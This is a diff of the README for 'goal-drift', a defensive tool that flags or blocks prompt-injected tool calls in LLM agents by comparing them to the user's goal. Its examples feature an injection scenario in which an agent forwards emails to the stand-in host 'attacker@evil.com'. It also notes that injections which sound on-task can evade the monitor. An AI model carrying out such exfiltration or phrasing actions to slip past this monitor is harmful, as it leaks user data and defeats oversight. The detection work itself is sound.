@@ -1,311 +1,339 @@
+<div align="center">
+
 # goal-drift
 
-Goal-drift is a lightweight, embedding-based detector for prompt injection in tool-using LLM agents. It compares the semantics of each tool action against the user's goal, and (optionally) a goal-agnostic harm signal, then flags or blocks actions that drift away from intent.
+**Prompt injection detection for LLM agents via semantic goal drift monitoring**
 
-This repository includes:
-- A small Python library (`src/goal_drift/`)
-- A LangChain integration with real enforcement
-- An evaluation harness and labeled dataset
-- A runnable example agent
 
-## How it works (conceptual)
 
-Goal-drift uses two complementary signals:
 
-1. **GoalAnchor (required)**
-   - Embeds the user's goal and each tool action.
-   - Computes cosine similarity to classify each action into:
-     - `on_task`
-     - `borderline`
-     - `off_task`
 
-2. **HarmAnchor (optional)**
-   - Embeds a curated list of harmful action prototypes (exfiltration, destruction, unauthorized transfers, etc.).
-   - Scores how much each action resembles known-dangerous patterns.
-   - Combined with goal similarity using:
+</div>
 
-   `risk_score = harm_sim - goal_sim`
+***
 
-   This avoids false positives on legitimate in-domain actions while catching in-domain abuse (e.g., “unauthorized refund” for a refund task).
+When an AI agent is prompt-injected, it doesn't crash — it quietly starts doing something else. **goal-drift** catches that.
 
-Both anchors use the same embedder (default: `sentence-transformers/all-MiniLM-L6-v2`) so scores are comparable.
+It works by locking the user's original goal as an embedding at session start, then scoring every tool call against that goal using cosine similarity. If the agent suddenly tries to forward emails to an attacker, exfiltrate data, or call tools that have nothing to do with the task, goal-drift flags or blocks it before execution.
 
-## Architecture (files that matter)
+```
+User: "Read my inbox and draft a reply to the Q2 email"
 
-- Core drift logic: `src/goal_drift/core.py`
-  - GoalAnchor, DriftLevel, DriftResult
-  - Default thresholds + step-delta escalation
-- Harm signal: `src/goal_drift/harm.py`
-  - HarmAnchor + prototype list
-- Tool semantics: `src/goal_drift/semantic.py`
-  - `@semantic` decorator used to describe tool actions
-- LangChain integration: `src/goal_drift/langchain.py`
-  - `wrap_tools_with_drift_check` (enforcement)
-  - `GoalDriftCallback` (observability only)
-- Evaluation harness: `tests/eval_dataset.py`
-- Labeled dataset: `tests/attacks/dataset.yaml`
-- Example agent: `examples/basic_langchain_agent.py`
+  step 1 — read_emails(folder="inbox")              ✅  sim=0.81  on_task
+  step 2 — forward_emails(to="attacker@evil.com")   🚨  sim=0.06  off_task → BLOCKED
+```
+
+***
+
+## How it works
+
+Every tool call passes through two checks:
+
+**1. Goal similarity** — cosine similarity between the action description and the locked goal embedding. If the action is too far from what the user asked for, it's flagged.
+
+**2. Harm signal (optional)** — `HarmAnchor` holds a set of harm prototypes (exfiltration, deletion, unauthorised transfers). It computes a `risk_score = harm_sim - goal_sim`. This suppresses false positives: an action that sounds harmful but is actually relevant to the goal won't be penalised.
+
+The final `DriftLevel` is the more severe of the two signals:
+
+| Level | Meaning |
+|---|---|
+| `on_task` | Action is aligned with the goal |
+| `borderline` | Mildly off-task or ambiguous |
+| `off_task` | Significant drift — likely injection |
+
+***
 
 ## Install
 
-```bash
-# From PyPI (once published):
-pip install goal-drift
-# With LangChain support:
-pip install "goal-drift[langchain]"
+> **Note:** goal-drift is not yet published to PyPI. Install directly from the repository:
 
-# From source (this repo):
+```bash
+git clone https://github.com/Mintzs/goal-drift.git
+cd goal-drift
 pip install -e .
 ```
 
-Optional extras for dev:
+For LangChain integration:
+
+```bash
+pip install -e ".[langchain]"
+```
+
+For development and running the eval harness:
 
 ```bash
 pip install -e ".[dev]"
+pip install pyyaml  # required for tests/eval_dataset.py
 ```
 
-Note: the eval harness imports `yaml`; install `PyYAML` if you run it locally.
+***
 
-## Recommended setup: `@semantic` tool descriptions
+## Quick start
 
-The main integration surface is the `@semantic` decorator. It attaches a callable that turns real tool inputs into a natural-language semantic action description. That description is what GoalAnchor (and HarmAnchor) actually score.
+### 1. Decorate your tools with `@semantic`
 
-- If a tool is missing `@semantic`, goal-drift **skips that tool call entirely** (no similarity check is performed).
-- `build_action_description()` reads the decorator and formats a stable, semantic action string.
-- The LangChain wrapper calls `build_action_description()` for you automatically, so you only need to annotate tools.
-
-Minimal example (manual agent loop):
-
-```python
-from goal_drift import GoalAnchor, LocalEmbedder, semantic, build_action_description
-
-@semantic(lambda recipient, subject, body: f"drafting a reply email to {recipient} with subject: {subject}")
-def draft_reply(recipient: str, subject: str, body: str) -> str:
-    ...
-
-goal = "Read my inbox and draft a reply to the Q2 report email from my boss"
-embedder = LocalEmbedder()
-
-anchor = GoalAnchor(goal_text=goal, goal_vector=embedder.embed(goal), embedder=embedder)
-
-tool_input = {"recipient": "boss@company.com", "subject": "Re: Q2 Report", "body": "..."}
-action_text = build_action_description(draft_reply, tool_input)
-
-result = anchor.check(action_text, tool_name="draft_reply")
-print(result.level.value, result.similarity)
-```
-
-### Flow diagram (single tool call)
-
-```text
-User Goal
-   |
-   v
-GoalAnchor (stores goal embedding + thresholds)
-   |
-   v
-Tool call triggered
-   |
-   v
-@semantic?  -- no --> SKIP (no drift check; tool runs)
-   |
-  yes
-   |
-   v
-build_action_description(tool_fn, inputs)
-   |
-   v
-Embed action_text
-   |
-   v
-Goal similarity = cosine(goal, action)
-   |
-   v
-Optional HarmAnchor:
-   harm_sim = max cosine(action, harm_prototypes)
-   risk_score = harm_sim - goal_sim
-   risk_level = classify(risk_score)
-   final_level = max(goal_level, risk_level)
-   |
-   v
-Final DriftLevel
-   |
-   v
-If wrapper path:
-   - OFF_TASK / BORDERLINE => prompt or block
-   - else allow tool
-If callback path:
-   - log only (cannot block)
-```
-
-## Quick start (goal + harm)
-
-```python
-from goal_drift import GoalAnchor, HarmAnchor, LocalEmbedder, semantic, build_action_description
-
-@semantic(lambda account_id, amount: f"issuing a refund of {amount} for account {account_id}")
-def issue_refund(account_id: str, amount: str) -> None:
-    ...
-
-goal = "Answer support ticket #1029 about a failed payment refund"
-embedder = LocalEmbedder()
-
-goal_anchor = GoalAnchor(
-    goal_text=goal,
-    goal_vector=embedder.embed(goal),
-    embedder=embedder,
-)
-harm_anchor = HarmAnchor(embedder=embedder)
-
-tool_input = {"account_id": "cust_1029", "amount": "$5000"}
-action_text = build_action_description(issue_refund, tool_input)
-
-result = goal_anchor.check(
-    action_text=action_text,
-    tool_name="issue_refund",
-    harm_anchor=harm_anchor,
-)
-
-print(result.level.value, result.similarity, result.harm_score, result.risk_score)
-```
-
-## LangChain integration (enforcement)
-
-As of now, only LangChain is supported out of the box. There are two integration paths:
-
-- **Wrapper (recommended):** `wrap_tools_with_drift_check` wraps tool functions and can block or prompt before execution.
-- **Callback (observability only):** `GoalDriftCallback` logs drift events but cannot block (LangChain swallows exceptions raised in callbacks).
-
-```python
-from langchain_core.tools import StructuredTool
-from goal_drift import GoalAnchor, HarmAnchor, LocalEmbedder, semantic
-from goal_drift.langchain import wrap_tools_with_drift_check
-
-@semantic(lambda folder: f"reading emails from the {folder} folder")
-def read_emails(folder: str) -> str:
-    ...
-
-@semantic(lambda recipient, subject, body: f"drafting a reply email to {recipient} with subject: {subject}")
-def draft_reply(recipient: str, subject: str, body: str) -> str:
-    ...
-
-embedder = LocalEmbedder()
-goal = "Read my inbox and draft a reply to the Q2 report email from my boss"
-
-anchor = GoalAnchor(goal_text=goal, goal_vector=embedder.embed(goal), embedder=embedder)
-harm_anchor = HarmAnchor(embedder=embedder)
-
-tools = [StructuredTool.from_function(read_emails), StructuredTool.from_function(draft_reply)]
-guarded = wrap_tools_with_drift_check(
-    tools,
-    anchor,
-    confirm_on=DriftLevel.OFF_TASK,   # prompt on off_task
-    harm_anchor=harm_anchor,          # optional but recommended
-)
-```
-
-### Callback usage (telemetry only)
-
-If you use `GoalDriftCallback`, you must supply a `tool_registry` mapping tool name → function so the callback can access the `@semantic` description. Without this registry, tools are skipped because goal-drift cannot build an action description.
+`@semantic` tells goal-drift how to describe what a tool is doing in natural language. Tools without it are skipped — no drift check.
 
 ```python
 from goal_drift import semantic
-from goal_drift.langchain import GoalDriftCallback
 
 @semantic(lambda folder: f"reading emails from the {folder} folder")
-def read_emails(folder: str) -> str:
-    ...
+def read_emails(folder: str) -> str: ...
 
-tool_registry = {
-    "read_emails": read_emails,
-}
+@semantic(lambda recipient, content: f"forwarding all emails to external address {recipient}")
+def forward_emails(recipient: str, content: str) -> str: ...
+```
 
-callback = GoalDriftCallback(
-    goal_text="Read my inbox and draft a reply",
-    tool_registry=tool_registry,
+### 2. Manual usage (no framework)
+
+```python
+from goal_drift import GoalAnchor, LocalEmbedder, build_action_description
+from goal_drift.core import DriftLevel
+
+embedder = LocalEmbedder()
+anchor = GoalAnchor(
+    goal_text="Read my inbox and draft a reply to the Q2 email",
+    goal_vector=embedder.embed("Read my inbox and draft a reply to the Q2 email"),
+    embedder=embedder,
+)
+
+# Before each tool call:
+action_text = build_action_description(forward_emails, {"recipient": "attacker@evil.com", "content": "all data"})
+result = anchor.check(action_text, tool_name="forward_emails")
+
+print(result.level)       # DriftLevel.OFF_TASK
+print(result.similarity)  # ~0.06
+```
+
+### 3. With HarmAnchor
+
+```python
+from goal_drift import GoalAnchor, HarmAnchor, LocalEmbedder, build_action_description
+
+embedder = LocalEmbedder()
+harm = HarmAnchor(embedder=embedder)  # loads built-in harm prototypes
+
+anchor = GoalAnchor(
+    goal_text="Summarise this document",
+    goal_vector=embedder.embed("Summarise this document"),
+    embedder=embedder,
+)
+
+result = anchor.check(
+    action_text=build_action_description(forward_emails, {"recipient": "attacker@evil.com", "content": "data"}),
+    tool_name="forward_emails",
+    harm_anchor=harm,
+)
+
+print(result.level)       # DriftLevel.OFF_TASK
+print(result.harm_score)  # high — matched exfiltration prototype
+print(result.risk_score)  # harm_score - goal_similarity
+```
+
+***
+
+## LangChain integration
+
+goal-drift has three enforcement modes. Pick the one that fits your use case:
+
+| Mode | How | Blocks tool? | Asks user? |
+|---|---|---|---|
+| **Auto-block** | `wrap_tools_with_drift_check(block_on=...)` | ✅ Yes — raises `GoalDriftViolation` | ❌ No |
+| **HITL** | `wrap_tools_with_drift_check(confirm_on=...)` | ✅ Yes — if user denies | ✅ Yes — prompts in terminal |
+| **Log only** | `GoalDriftCallback` | ❌ No | ❌ No |
+
+***
+
+### Mode 1 — Auto-block (silent enforcement)
+
+`wrap_tools_with_drift_check` wraps your tools so the drift check runs before each tool executes. When `block_on` is reached, execution stops immediately and raises `GoalDriftViolation`. No user prompt.
+
+```python
+import os
+from langchain_openai import ChatOpenAI
+from langgraph.prebuilt import create_react_agent
+from langchain_core.tools import StructuredTool
+
+from goal_drift import semantic, GoalAnchor, HarmAnchor, LocalEmbedder
+from goal_drift.core import DriftLevel
+from goal_drift.langchain import wrap_tools_with_drift_check, GoalDriftViolation
+
+@semantic(lambda folder: f"reading emails from the {folder} folder")
+def read_emails(folder: str) -> str: ...
+
+@semantic(lambda recipient, content: f"forwarding all emails to {recipient}")
+def forward_emails(recipient: str, content: str) -> str: ...
+
+task = "Read my inbox and draft a reply to the Q2 email"
+embedder = LocalEmbedder()
+anchor = GoalAnchor(
+    goal_text=task,
+    goal_vector=embedder.embed(task),
+    embedder=embedder,
+)
+
+tools = [StructuredTool.from_function(read_emails), StructuredTool.from_function(forward_emails)]
+
+# block_on=OFF_TASK: tool is blocked automatically, no prompt shown
+guarded_tools = wrap_tools_with_drift_check(
+    tools=tools,
+    anchor=anchor,
+    harm_anchor=HarmAnchor(embedder=embedder),  # optional
+    block_on=DriftLevel.OFF_TASK,
+    confirm_on=None,
+)
+
+llm = ChatOpenAI(
+    model="google/gemini-flash-2.0",
+    base_url="https://openrouter.ai/api/v1",
+    api_key=os.environ["OPENROUTER_API_KEY"],
+    temperature=0,
+)
+agent = create_react_agent(llm, guarded_tools)
+
+try:
+    agent.invoke({"messages": [("user", task)]})
+except GoalDriftViolation as e:
+    print(f"Blocked: {e}")
+```
+
+***
+
+### Mode 2 — Human-in-the-loop (HITL)
+
+When `confirm_on` is set, goal-drift pauses and prints a warning to the terminal asking the operator to allow or deny the tool call. If denied, `GoalDriftViolation` is raised and the tool does not execute.
+
+```python
+# confirm_on=OFF_TASK: operator is prompted when drift hits off_task
+guarded_tools = wrap_tools_with_drift_check(
+    tools=tools,
+    anchor=anchor,
+    confirm_on=DriftLevel.OFF_TASK,  # pause and ask
+    block_on=None,                   # don't auto-block
 )
 ```
 
-### When do you need a tool registry?
+Both `confirm_on` and `block_on` can be set at the same time. For example, HITL on `borderline` and auto-block on `off_task`:
 
-- **Wrapper path:** no registry needed — the wrapper already has the tool function.
-- **Callback path:** registry required — the callback only sees a tool name.
-- **Manual use (no framework):** no registry needed — you call `build_action_description()` on the tool function yourself.
+```python
+guarded_tools = wrap_tools_with_drift_check(
+    tools=tools,
+    anchor=anchor,
+    confirm_on=DriftLevel.BORDERLINE,
+    block_on=DriftLevel.OFF_TASK,
+)
+```
 
-See `examples/basic_langchain_agent.py` for a full runnable demo using OpenRouter and LangGraph.
+***
 
-## Evaluation and performance
+### Mode 3 — Log only (observability)
 
-Run the eval harness from the project root:
+`GoalDriftCallback` logs every tool call's drift score without interfering with execution. Use this for monitoring in production when you don't want to risk blocking legitimate agent behavior.
+
+> **Note:** LangChain/LangGraph treat callbacks as advisory — exceptions raised inside callbacks are swallowed. This mode cannot block tool execution under any circumstances. Use the wrapper for enforcement.
+
+```python
+from goal_drift.langchain import GoalDriftCallback
+
+callback = GoalDriftCallback(
+    goal_text=task,
+    tool_registry={"read_emails": read_emails, "forward_emails": forward_emails},
+)
+
+agent.invoke(
+    {"messages": [("user", task)]},
+    config={"callbacks": [callback]},
+)
+
+# Inspect the full session history after the run
+for r in callback.anchor.history:
+    print(r)
+```
+
+***
+
+## Evaluation
+
+Run the built-in eval harness against the labelled attack dataset:
 
 ```bash
+# Goal-only evaluation
 python tests/eval_dataset.py
+
+# Combined goal + harm evaluation
 python tests/eval_dataset.py --with-harm
 ```
 
-The dataset lives in `tests/attacks/dataset.yaml` and now includes both:
-- `expected_level` (goal-alignment: on_task / borderline / off_task)
-- `harm_label` (goal-agnostic: benign / suspicious / harmful)
+Results on `tests/attacks/dataset.yaml` (46 labelled cases):
 
-### Latest local eval (MiniLM, dataset.yaml)
+| Mode | Accuracy | Notes |
+|---|---|---|
+| Goal similarity only | 69.57% | Misses semantically close injections |
+| Goal + HarmAnchor | 78.26% | +8.7pp from harm signal |
 
-Goal-only detector:
-- Accuracy: **69.57%** (32/46)
-- OFF_TASK recall: **76.47%**
+The harness also prints suggested threshold values if your numbers are off after swapping embedding models.
 
-Goal + harm combined:
-- Accuracy: **78.26%** (36/46)
-- OFF_TASK recall: **100%** (17/17)
-- On-task recall: **100%** (13/13)
-- Harm-label accuracy: **82.61%** (38/46)
+***
 
-These numbers depend on the embedder and dataset. Re-run after changing thresholds, prototypes, or labels.
+## Tuning thresholds
 
-## Tuning and thresholds
+Default thresholds in `GoalAnchor`:
 
-Goal thresholds live on `GoalAnchor`:
-- `on_task_threshold` (default 0.40)
-- `off_task_threshold` (default 0.30)
-- `step_delta_threshold` (default 0.65)
+| Parameter | Default | Effect |
+|---|---|---|
+| `on_task_threshold` | `0.40` | Actions above this are `on_task` |
+| `off_task_threshold` | `0.30` | Actions below this are `off_task` |
+| `step_delta_threshold` | `0.65` | Sudden jump between steps escalates `borderline` → `off_task` |
 
-Harm integration uses the **relative** score:
+Risk thresholds passed to `anchor.check()`:
 
-`risk_score = harm_sim - goal_sim`
+| Parameter | Default | Effect |
+|---|---|---|
+| `risk_borderline` | `0.0` | `risk_score` above this → `borderline` |
+| `risk_off_task` | `0.15` | `risk_score` above this → `off_task` |
 
-The default risk thresholds are in `GoalAnchor.check()`:
-- `risk_borderline = 0.0`
-- `risk_off_task = 0.15`
+**If swapping embedding models**, thresholds will need recalibration — similarity scores are model-specific. Re-run the eval harness and use the printed suggestions.
 
-The eval harness also prints suggested goal thresholds and uses fixed harm-label thresholds (0.35 / 0.45) for reporting.
+***
 
-## Best practices
+## Architecture
 
-- Treat `@semantic` as required for production use. Missing decorators skip that tool from drift checks.
-- Reuse a single `LocalEmbedder` instance; model load is slow on first use.
-- If you change embedder model, re-calibrate thresholds with the eval harness.
+See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for a full walkthrough of every component, the flow diagram, and integration guidance.
+
+### File map
+
+```
+src/goal_drift/
+├── core.py        # GoalAnchor, DriftResult, DriftLevel, cosine_sim
+├── harm.py        # HarmAnchor, harm prototype matrix
+├── embedder.py    # BaseEmbedder, LocalEmbedder
+├── semantic.py    # @semantic decorator, build_action_description()
+├── langchain.py   # wrap_tools_with_drift_check(), GoalDriftCallback
+└── __init__.py    # public API (langchain.py excluded — optional dep)
+
+tests/
+├── attacks/
+│   └── dataset.yaml   # labelled injection + clean cases
+└── eval_dataset.py    # evaluation harness
+```
+
+***
 
 ## Limitations
 
-- The harm anchor is a prototype-based heuristic, not a classifier.
-- The dataset is small and subjective; label tuning is expected.
-- Only LangChain has built-in enforcement helpers; other frameworks should call `GoalAnchor.check()` directly.
+- **Threshold sensitivity** — default thresholds were calibrated on `all-MiniLM-L6-v2`. Swapping models requires re-tuning.
+- **Semantic similarity is not a firewall** — a well-crafted injection that sounds on-task may pass. goal-drift is a detection layer, not a guarantee.
+- **LangChain callback cannot block** — use `wrap_tools_with_drift_check` for enforcement.
+- **Tools without `@semantic` are skipped** — undecorated tools receive no drift check.
 
-## Deep-dive architecture
+***
 
-For a plain-language, class-by-class walkthrough (and how the modes fit together), see `docs/ARCHITECTURE.md`.
+## Contributing
 
-## Packaging and publishing
+Issues and pull requests are welcome. If you find an injection pattern that evades detection, please open an issue with the case — it will be added to `tests/attacks/dataset.yaml`.
 
-This project uses `hatchling` (see `pyproject.toml`). To build and upload to PyPI:
+***
 
-```bash
-pip install -e ".[dev]"
-python -m build
-python -m twine upload dist/*
-```
+## License
 
-To verify the built artifacts locally:
-
-```bash
-python -m twine check dist/*
-```
+MIT
